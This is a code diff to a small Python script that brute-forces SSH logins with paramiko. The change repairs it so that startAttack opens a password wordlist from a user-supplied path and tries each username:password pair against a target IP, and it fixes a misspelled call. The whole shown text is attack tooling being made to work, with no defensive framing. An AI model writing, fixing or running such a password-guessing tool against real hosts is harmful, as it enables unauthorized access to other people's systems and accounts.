@@ -1,7 +1,8 @@
 import paramiko
 from colorama import init, Fore, Style
 
-def startAttack(ip, username, password):
+def startAttack(ip, username, path):
+    passwords = open(path)
     for password in passwords:
         password = password.strip()
         print(f"Trying: {username}:{password}")
@@ -22,9 +23,7 @@ def getInputs():
         ip = input("Enter ip address: ")
         username = input("Enter username: ")
         path = input("Enter password path: ")
-        passwords = open(path)
-        if ip and username and password:
-            tartAttack(ip,username, password)
+        startAttack(ip,username, path)
     except KeyboardInterrupt as e:
         print(f"{Fore.RED}{Style.BRIGHT}\n[-]  Exited")
     except Exception as e:
